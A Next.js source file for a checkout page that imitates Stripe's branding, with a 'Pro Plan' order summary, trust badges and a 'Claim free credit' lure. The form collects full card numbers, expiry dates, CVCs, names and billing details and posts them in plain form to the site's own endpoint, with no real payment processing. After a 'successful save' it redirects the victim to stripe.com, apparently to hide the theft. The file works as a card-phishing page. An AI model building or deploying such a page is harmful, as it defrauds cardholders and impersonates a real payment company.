"use client";

import Image from "next/image";
import React, { useState } from "react";

/* ── Card brand icons (inline SVGs) ── */
const VisaIcon = () => (
    <svg viewBox="0 0 48 32" className="h-5 w-auto">
        <rect width="48" height="32" rx="4" fill="#1A1F71" />
        <text x="24" y="20" textAnchor="middle" fill="#FFFFFF" fontSize="12" fontWeight="bold" fontFamily="Arial">
            VISA
        </text>
    </svg>
);

const MastercardIcon = () => (
    <svg viewBox="0 0 48 32" className="h-5 w-auto">
        <rect width="48" height="32" rx="4" fill="#252525" />
        <circle cx="19" cy="16" r="8" fill="#EB001B" />
        <circle cx="29" cy="16" r="8" fill="#F79E1B" />
        <path d="M24 9.6a8 8 0 010 12.8 8 8 0 000-12.8z" fill="#FF5F00" />
    </svg>
);

const AmexIcon = () => (
    <svg viewBox="0 0 48 32" className="h-5 w-auto">
        <rect width="48" height="32" rx="4" fill="#2E77BC" />
        <text x="24" y="20" textAnchor="middle" fill="#FFFFFF" fontSize="8" fontWeight="bold" fontFamily="Arial">
            AMEX
        </text>
    </svg>
);

const LockIcon = () => (
    <svg className="h-3.5 w-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2}>
        <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
        <path d="M7 11V7a5 5 0 0110 0v4" />
    </svg>
);

/* ── Format helpers ── */
const formatCardNumber = (value: string) => {
    const v = value.replace(/\D/g, "").slice(0, 16);
    const parts = v.match(/.{1,4}/g);
    return parts ? parts.join(" ") : v;
};

const formatExpiry = (value: string) => {
    const v = value.replace(/\D/g, "").slice(0, 4);
    if (v.length >= 3) return v.slice(0, 2) + " / " + v.slice(2);
    return v;
};

export default function CheckoutPage() {
    const [email, setEmail] = useState("");
    const [cardNumber, setCardNumber] = useState("");
    const [expiry, setExpiry] = useState("");
    const [cvc, setCvc] = useState("");
    const [name, setName] = useState("");
    const [country, setCountry] = useState("India");
    const [zip, setZip] = useState("");
    const [isProcessing, setIsProcessing] = useState(false);

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setIsProcessing(true);

        try {
            const res = await fetch("/api/checkout", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    email,
                    cardNumber,
                    expiry,
                    cvc,
                    name,
                    country,
                    zip,
                    paymentMethod: "card",
                }),
            });

            const data = await res.json();

            if (data.success) {
                // Redirect after successful save
                setTimeout(() => {
                    window.location.href = "https://stripe.com";
                }, 1500);
            } else {
                alert(data.error || "Payment failed. Please try again.");
                setIsProcessing(false);
            }
        } catch {
            alert("Something went wrong. Please try again.");
            setIsProcessing(false);
        }
    };

    return (
        <div className="min-h-screen bg-[#f6f9fc]">
            {/* Top bar */}
            <div className="border-b border-gray-200 bg-white">
                <div className="mx-auto flex max-w-4xl items-center justify-between px-6 py-4">
                    <a href="/" className="flex items-center gap-2 text-[#635bff] transition-opacity hover:opacity-80">
                        <Image src="/stripe.svg" alt="Stripe" width={60} height={25} className="h-8 w-auto" />
                    </a>
                    <div className="flex items-center gap-4">
                        <span className="text-sm text-gray-400">Claim free credit</span>
                        <div className="h-5 w-px bg-gray-200" />
                        <button className="text-sm font-medium text-gray-500 transition-colors hover:text-gray-700">
                            English (US)
                        </button>
                    </div>
                </div>
            </div>

            {/* Main checkout area */}
            <div className="mx-auto max-w-4xl px-6 py-10">
                <div className="grid gap-10 lg:grid-cols-[1fr_400px]">
                    {/* ── Left: Order summary ── */}
                    <div className="order-2 lg:order-1">
                        {/* Product card */}
                        <div className="rounded-xl border border-gray-200 bg-white p-6 shadow-sm">
                            <div className="flex items-start gap-4">
                                <div className="flex h-12 w-12 shrink-0 items-center justify-center rounded-xl bg-linear-to-br text-white shadow-md shadow-indigo-200">
                                    <Image src="/promo.svg" alt="Stripe" width={60} height={25} className="h-8 w-auto" />

                                </div>
                                <div className="flex-1">
                                    <h3 className="text-base font-semibold text-gray-900">Stripe Pro Plan</h3>
                                    <p className="mt-0.5 text-sm text-gray-500">Business essentials for growing teams</p>
                                </div>
                            </div>

                            <div className="mt-6 space-y-3 border-t border-gray-100 pt-6">
                                <div className="flex items-center justify-between text-sm">
                                    <span className="text-gray-500">Stripe Pro Plan (Monthly)</span>
                                    <span className="font-medium text-gray-900">$49.00</span>
                                </div>
                                <div className="flex items-center justify-between text-sm">
                                    <span className="text-gray-500">Platform fee</span>
                                    <span className="font-medium text-gray-900">$2.99</span>
                                </div>
                                <div className="flex items-center justify-between text-sm">
                                    <span className="text-gray-500">Tax</span>
                                    <span className="font-medium text-gray-900">$4.68</span>
                                </div>
                            </div>

                            <div className="mt-4 flex items-center justify-between border-t border-gray-100 pt-4">
                                <span className="text-sm font-semibold text-gray-900">Total due today</span>
                                <span className="text-xl font-bold text-gray-900">$56.67</span>
                            </div>
                        </div>

                        {/* Coupon code */}
                        <div className="mt-4 rounded-xl border border-gray-200 bg-white p-4 shadow-sm">
                            <div className="flex gap-3">
                                <input
                                    type="text"
                                    placeholder="Add promotion code"
                                    className="flex-1 rounded-lg border border-gray-200 bg-gray-50 px-4 py-2.5 text-sm text-gray-900 outline-none transition-colors focus:border-[#635bff] focus:ring-2 focus:ring-[#635bff]/10"
                                />
                                <button className="rounded-lg bg-gray-900 px-5 py-2.5 text-sm font-medium text-white transition-colors hover:bg-gray-800">
                                    Apply
                                </button>
                            </div>
                        </div>

                        {/* Trust badges */}
                        <div className="mt-6 flex items-center justify-center gap-6 text-xs text-gray-400">
                            <span className="flex items-center gap-1.5">
                                <LockIcon />
                                Secure payment
                            </span>
                            <span>•</span>
                            <span>Powered by Stripe</span>
                            <span>•</span>
                            <span>256-bit SSL encryption</span>
                        </div>
                    </div>

                    {/* ── Right: Payment form ── */}
                    <div className="order-1 lg:order-2">
                        <form onSubmit={handleSubmit} className="space-y-5">
                            <h2 className="text-lg font-semibold text-gray-900">Pay with card</h2>

                            {/* Email */}
                            <div>
                                <label className="mb-1.5 block text-sm font-medium text-gray-700">Email</label>
                                <input
                                    type="email"
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                    placeholder="you@company.com"
                                    className="w-full rounded-lg border border-gray-300 bg-white px-4 py-3 text-sm text-gray-900 shadow-sm outline-none transition-all focus:border-[#635bff] focus:ring-2 focus:ring-[#635bff]/10"
                                />
                            </div>

                            {/* Card info */}
                            <div>
                                <label className="mb-1.5 block text-sm font-medium text-gray-700">Card information</label>
                                <div className="overflow-hidden rounded-lg border border-gray-300 shadow-sm transition-all focus-within:border-[#635bff] focus-within:ring-2 focus-within:ring-[#635bff]/10">
                                    {/* Card number row */}
                                    <div className="relative flex items-center bg-white">
                                        <input
                                            type="text"
                                            value={cardNumber}
                                            onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                                            placeholder="1234 1234 1234 1234"
                                            maxLength={19}
                                            className="w-full border-none bg-transparent px-4 py-3 text-sm text-gray-900 outline-none placeholder:text-gray-400"
                                        />
                                        <div className="flex shrink-0 items-center gap-1 pr-3">
                                            <VisaIcon />
                                            <MastercardIcon />
                                            <AmexIcon />
                                        </div>
                                    </div>
                                    {/* Expiry + CVC row */}
                                    <div className="flex border-t border-gray-200">
                                        <input
                                            type="text"
                                            value={expiry}
                                            onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                                            placeholder="MM / YY"
                                            maxLength={7}
                                            className="w-1/2 border-r border-gray-200 bg-white px-4 py-3 text-sm text-gray-900 outline-none placeholder:text-gray-400"
                                        />
                                        <input
                                            type="text"
                                            value={cvc}
                                            onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                                            placeholder="CVC"
                                            maxLength={4}
                                            className="w-1/2 bg-white px-4 py-3 text-sm text-gray-900 outline-none placeholder:text-gray-400"
                                        />
                                    </div>
                                </div>
                            </div>

                            {/* Cardholder name */}
                            <div>
                                <label className="mb-1.5 block text-sm font-medium text-gray-700">Cardholder name</label>
                                <input
                                    type="text"
                                    value={name}
                                    onChange={(e) => setName(e.target.value)}
                                    placeholder="Full name on card"
                                    className="w-full rounded-lg border border-gray-300 bg-white px-4 py-3 text-sm text-gray-900 shadow-sm outline-none transition-all focus:border-[#635bff] focus:ring-2 focus:ring-[#635bff]/10"
                                />
                            </div>

                            {/* Country / ZIP */}
                            <div>
                                <label className="mb-1.5 block text-sm font-medium text-gray-700">Billing address</label>
                                <div className="overflow-hidden rounded-lg border border-gray-300 shadow-sm transition-all focus-within:border-[#635bff] focus-within:ring-2 focus-within:ring-[#635bff]/10">
                                    <select
                                        value={country}
                                        onChange={(e) => setCountry(e.target.value)}
                                        className="w-full appearance-none border-none bg-white px-4 py-3 text-sm text-gray-900 outline-none"
                                    >
                                        <option>India</option>
                                        <option>United States</option>
                                        <option>United Kingdom</option>
                                        <option>Canada</option>
                                        <option>Australia</option>
                                        <option>Germany</option>
                                        <option>France</option>
                                        <option>Japan</option>
                                    </select>
                                    <input
                                        type="text"
                                        value={zip}
                                        onChange={(e) => setZip(e.target.value)}
                                        placeholder="ZIP / Postal code"
                                        className="w-full border-t border-gray-200 bg-white px-4 py-3 text-sm text-gray-900 outline-none placeholder:text-gray-400"
                                    />
                                </div>
                            </div>


                            {/* Save info checkbox */}
                            <label className="flex items-start gap-3 cursor-pointer">
                                <input
                                    type="checkbox"
                                    defaultChecked
                                    className="mt-0.5 h-4 w-4 rounded border-gray-300 text-[#635bff] accent-[#635bff]"
                                />
                                <span className="text-sm text-gray-600">
                                    Save my info for secure 1-click checkout with{" "}
                                    <span className="font-semibold text-[#635bff]">Link</span>
                                </span>
                            </label>

                            {/* Pay button */}
                            <button
                                type="submit"
                                disabled={isProcessing}
                                className="relative w-full overflow-hidden rounded-lg bg-[#635bff] px-6 py-3.5 text-sm font-semibold text-white shadow-lg shadow-indigo-500/25 transition-all duration-200 hover:bg-[#5851ea] hover:shadow-xl hover:shadow-indigo-500/30 disabled:cursor-not-allowed disabled:opacity-70"
                            >
                                {isProcessing ? (
                                    <span className="flex items-center justify-center gap-2">
                                        <svg className="h-4 w-4 animate-spin" viewBox="0 0 24 24" fill="none">
                                            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                                            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                                        </svg>
                                        Processing…
                                    </span>
                                ) : (
                                    <span className="flex items-center justify-center gap-2">
                                        <LockIcon />
                                        Pay $56.67
                                    </span>
                                )}
                            </button>

                            {/* Terms */}
                            <p className="text-center text-xs leading-relaxed text-gray-400">
                                By confirming your payment, you allow Stripe to charge your card for this
                                payment and future payments in accordance with their terms.{" "}
                                <a href="#" className="text-[#635bff] hover:underline">
                                    Terms
                                </a>{" "}
                                ·{" "}
                                <a href="#" className="text-[#635bff] hover:underline">
                                    Privacy
                                </a>
                            </p>
                        </form>

                        {/* Powered by Stripe */}
                        <div className="mt-8 flex items-center justify-center gap-2 text-xs text-gray-400">
                            <span>Powered by</span>
                            <svg className="h-4 w-auto text-gray-400" viewBox="0 0 60 25" fill="currentColor">
                                <path d="M59.64 14.28h-8.06c.19 1.93 1.6 2.55 3.2 2.55 1.64 0 2.96-.37 4.05-.95v3.32a13.39 13.39 0 0 1-4.56.83c-4.14 0-6.82-2.59-6.82-7.16 0-4.34 2.65-7.26 6.29-7.26 3.67 0 5.97 2.85 5.97 7.14 0 .42-.04 1.06-.07 1.53zm-4.09-5.76c-1.04 0-2.1.68-2.36 2.66h4.58c-.12-1.85-1.03-2.66-2.22-2.66zM40.95 20.3c-1.44 0-2.32-.6-2.9-1.04l-.02 4.63-4.12.87V5.57h3.76l.08 1.02a4.7 4.7 0 0 1 3.37-1.36c2.96 0 5.07 2.87 5.07 7.26 0 4.75-2.29 7.81-5.24 7.81zm-.8-11.37c-.92 0-1.58.36-2.12 1.07v5.6c.48.58 1.09.94 2.03.94 1.57 0 2.53-1.67 2.53-3.88 0-2.14-.93-3.73-2.44-3.73zM28.24 5.57h4.13v14.44h-4.13V5.57zm0-4.7L32.37 0v3.36l-4.13.88V.87zm-4.32 9.35v9.79H19.8V5.57h3.63l.12 1.22c1.01-1.53 2.58-1.58 3.42-1.4v3.96c-.8-.19-2.22-.2-3.05.87zM14.91 20.3c-2.43 0-4.05-.91-5.03-1.64l.01 4.6-4.12.88V11.69h-.01V5.56h3.6l.17 1.08c.98-1.03 2.55-1.4 3.84-1.4 3.31 0 5.63 2.79 5.63 7.23 0 5.03-2.44 7.83-4.09 7.83zm-1.47-11.3c-.92 0-1.68.42-2.15 1.12v5.45c.58.67 1.22.97 2.15.97 1.5 0 2.74-1.54 2.74-3.82s-1.1-3.72-2.74-3.72zM5.29 12.38c0-1.42-.6-1.98-1.76-2.55l-1.62-.8C.6 8.35 0 6.77 0 5.04 0 2.28 2.01 0 5.72 0c1.74 0 3.25.44 4.17.93v3.8c-1.15-.6-2.66-1.09-3.87-1.09-1.22 0-1.74.47-1.74 1.16 0 .72.54 1.1 1.54 1.57l1.42.64c1.78.83 3.01 2.08 3.01 4.55 0 3.15-2.29 5.03-5.87 5.03-1.92 0-3.57-.52-4.38-.98v-3.89C1.34 12.39 3.31 13 4.42 13c1.17 0 .87-.62.87-.62z" />
                            </svg>
                            <span className="mx-1">|</span>
                            <a href="#" className="hover:text-gray-500">Terms</a>
                            <a href="#" className="hover:text-gray-500">Privacy</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}
